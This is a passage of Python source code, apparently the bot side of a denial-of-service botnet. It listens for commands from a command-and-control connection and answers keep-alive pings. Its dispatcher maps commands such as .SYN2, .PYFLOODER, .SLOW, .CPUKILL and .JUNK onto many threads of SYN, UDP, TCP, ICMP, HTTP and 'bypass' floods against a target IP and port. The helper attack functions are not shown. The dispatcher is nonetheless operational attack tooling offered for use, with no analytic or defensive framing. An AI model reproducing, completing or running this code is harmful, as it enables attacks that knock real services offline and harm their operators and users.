                    threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port)).start()
                    threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port)).start()
            elif command == '.SYN2':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    t1 = threading.Thread(target=attack_syn2, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn2, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn2, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn2, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn2, args=(ip,port,secs))
                    t1.start()
            elif command == '.SYN3':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    t1 = threading.Thread(target=attack_syn3, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn3, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn3, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn3, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn3, args=(ip,port,secs))
                    t1.start()
            elif command == '.SYN4':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    t1 = threading.Thread(target=attack_syn4, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn4, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn4, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn4, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn4, args=(ip,port,secs))
                    t1.start()
            elif command == '.SYN5':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                    t1 = threading.Thread(target=attack_syn2, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn3, args=(ip,port,secs))
                    t1.start()
                    t1 = threading.Thread(target=attack_syn4, args=(ip,port,secs))
                    t1.start()
            elif command == '.HTTP_5050':
                 
                ip = args[1]
                secs = time.time() + int(args[2])
                threads = int(args[3])

                for _ in range(threads):
                    threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
            elif command == '.HTTP_GET':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
            elif command == '.PYFLOODER':
                 ip = ""
                 host = ""
                 url = str(args[1])
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 type_attack = str(args[4])
                 threads = int(args[5])

                 try:
                     host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                     ip = socket.gethostbyname(host)
                 except socket.gaierror:
                    print("CAN'T GET IP . . .")

                 while time.time() < secs:
                     t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                     t1.start()
            elif command == '.PYFLOODER_HELL':
                 ip = ""
                 host = ""
                 url = str(args[1])
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 threads = int(args[4])

                 try:
                     host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                     ip = socket.gethostbyname(host)
                 except socket.gaierror:
                    print("CAN'T GET IP . . .")

                 for type_attack in hell_packet_head:
                    while time.time() < secs:
                        t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                        t1.start()
                        t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                        t1.start()
                        t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                        t1.start()
                        t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                        t1.start()
                        t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                        t1.start()
            elif command == '.PYFLOODER_HELL2':
                 ip = ""
                 host = ""
                 url = str(args[1])
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 threads = int(args[4])

                 try:
                     host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                     ip = socket.gethostbyname(host)
                 except socket.gaierror:
                    print("CAN'T GET IP . . .")
                
                 while time.time() < secs:
                    type_attack = random.choice((hell_packet_head))
                    t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                    t1.start()
                    t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                    t1.start()
                    t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                    t1.start()
                    t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                    t1.start()
                    t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                    t1.start()
            elif command == '.PYFLOODER_6K':
                 ip = ""
                 host = ""
                 url = str(args[1])
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 threads = int(args[4])

                 try:
                     host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                     ip = socket.gethostbyname(host)
                 except socket.gaierror:
                    print("CAN'T GET IP . . .")

                 while time.time() < secs:
                    for _ in range(250):
                        th1 = threading.Thread(target=attack_http_pyflooder_6k,args=(ip, port,host))
                        th1.start()
            elif command == '.PYFLOODER2':
                 ip = ""
                 host = ""
                 url = str(args[1])
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 type_attack = str(args[4])
                 threads = int(args[5])

                 try:
                     host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                     ip = socket.gethostbyname(host)
                 except socket.gaierror:
                    print("CAN'T GET IP . . .")

                 while time.time() < secs:
                     t1 = threading.Thread(target=attack_pyflooder2, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder2, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder2, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder2, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder2, args=(ip,host, port,type_attack))
                     t1.start()
            elif command == '.PYFLOODER3':
                 ip = ""
                 host = ""
                 url = str(args[1])
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 type_attack = str(args[4])
                 threads = int(args[5])

                 try:
                     host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                     ip = socket.gethostbyname(host)
                 except socket.gaierror:
                    print("CAN'T GET IP . . .")

                 while time.time() < secs:
                     t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder2, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder2, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder2, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder2, args=(ip,host, port,type_attack))
                     t1.start()
                     t1 = threading.Thread(target=attack_pyflooder2, args=(ip,host, port,type_attack))
                     t1.start()

            elif command == '.HTTP_PPS':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_pps, args=(ip, port, secs), daemon=True).start()
            elif command == '.STD':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_std, args=(ip, port, secs), daemon=True).start()
            elif command == '.SLOW':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=sloworis, args=(ip, port, secs), daemon=True).start()
            elif command == '.RATE_ATTACK':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                mode = args[4]
                threads = int(args[5])

                while time.time() < secs:
                    if "1" in mode:
                        threading.Thread(target=Constant_Increasing_rate_attack, args=(ip, port), daemon=True).start()
                        time.sleep(7)
                    elif "2" in mode:
                        threading.Thread(target=Constant_Increasing_rate_attack, args=(ip, port)).start()
                        time.sleep(7)
                    elif "3" in mode:
                        th1 = threading.Thread(target=Constant_Increasing_rate_attack, args=(ip, port))
                        th1.start()
                        time.sleep(7)
            elif command == '.RATE_ATTACK2':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                mode = args[4]
                threads = int(args[5])

                for _ in range(threads):
                    if "1" in mode:
                        threading.Thread(target=Constant_Increasing_rate_attack2, args=(ip, port,secs), daemon=True).start()
                        time.sleep(7)
                    elif "2" in mode:
                        threading.Thread(target=Constant_Increasing_rate_attack2, args=(ip, port,secs)).start()
                        time.sleep(7)
                    elif "3" in mode:
                        th1 = threading.Thread(target=Constant_Increasing_rate_attack2, args=(ip, port,secs))
                        th1.start()
                        time.sleep(7)
            elif command == '.HSCD':
                url_send = args[1]
                mode  = args[2]
                secs = time.time() + int(args[3])
                threads = int(args[4])
                while time.time() < secs:
                    threading.Thread(target=Attack_By_Cve_DOS1,args=(url_send, mode)).start()
            elif command == '.HEX':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
            elif command == '.RHEX':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_rhex, args=(ip, port, secs), daemon=True).start()
            elif command == '.WIFI_RESOURCES':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                number_attack = int(args[4])
                threads = int(args[5])

                while time.time() < secs:
                    threading.Thread(target=attack_wifi, args=(ip, port,number_attack), daemon=True).start()
            elif command == '.WIFI_REUN':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                number_attack = int(args[4])
                threads = int(args[5])

                while time.time() < secs:
                    threading.Thread(target=attack_wifi, args=(ip, port,number_attack), daemon=True).start()
                    threading.Thread(target=attack_wifi2, args=(ip, port,number_attack), daemon=True).start()
            elif command == '.WIFI_UNREACHABLE':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                number_attack = int(args[4])
                threads = int(args[5])

                while time.time() < secs:
                    threading.Thread(target=attack_wifi2, args=(ip, port,number_attack), daemon=True).start()
            elif command == '.HEXCPU':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
            elif command == '.CPUKILL':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
            elif command == '.VSE':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
            elif command == '.HTTP_MIX':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
            elif command == '.TUP_OLD':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.JUNK':
                
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                method = args[4]
                threads = int(args[5])
                
                if "1" in method:
                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        for _ in range(threads):
                            threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                            threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
                            threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                elif "2" in method:
                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                    for _ in range(threads):
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                elif "3" in method:
                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                elif "4" in method:
                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
                        threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
                elif "5" in method:
                    for _ in range(threads):
                        size = 65500
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
                        threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
                elif "6" in method:
                    for _ in range(threads):
                        size = 65500
                        url = f"http://{ip}"
                        threading.Thread(target=REQ_attack, args=(url, port, secs), daemon=True).start()
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
                        threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
                        url = f"https://{ip}"
                        threading.Thread(target=REQ_attack, args=(url, port, secs), daemon=True).start()
                elif "7" in method:
                    for _ in range(threads):
                        size = 65500
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
                        threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_udp_bypass, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
                elif "8" in method:
                    for _ in range(threads):
                        size = 1314
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
                        threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_udp_bypass, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
            elif command == 'PING':
                c2.send('PONG'.encode())
            elif command == 'STOP_RATE_ATTACK':
                STOP_Constant_Increasing_rate_attack = True

        except:
            break

    c2.close()

    main()

if __name__ == '__main__':
    try:
        main()
    except:
        pass